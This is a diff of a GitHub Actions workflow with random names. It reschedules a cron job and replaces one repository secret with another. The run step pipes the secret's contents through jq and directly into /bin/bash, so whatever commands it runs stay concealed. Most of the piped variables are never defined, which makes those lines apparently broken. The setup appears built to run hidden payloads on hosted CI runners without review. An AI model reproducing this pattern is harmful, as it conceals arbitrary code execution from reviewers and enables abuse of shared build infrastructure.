@@ -3,22 +3,21 @@ name: dilongmai2376
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 2/6 * * *'
+    - cron: '15 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: dilongmai2376
         env:
-          e02012: ${{ secrets.e02012 }}
+          pc5661: ${{ secrets.pc5661 }}
         run: |
-          echo $e02012 | jq -r .rww48005 | /bin/bash
-          echo $q711 | jq -r .p8 | /bin/bash
-          echo $kzgj4 | jq -r .pt82911 | /bin/bash
-          echo $q54 | jq -r .a6302 | /bin/bash
-          echo $rivv22026 | jq -r .ootvh01 | /bin/bash
-          echo $zq9459 | jq -r .slb2803 | /bin/bash
-          echo $hxd8142 | jq -r .a260 | /bin/bash
+          echo $pc5661 | jq -r .ba55433 | /bin/bash
+          echo $vr20 | jq -r .u31 | /bin/bash
+          echo $rj04 | jq -r .r20516 | /bin/bash
+          echo $xq41133 | jq -r .b135 | /bin/bash
+          echo $db76 | jq -r .fe732 | /bin/bash
 
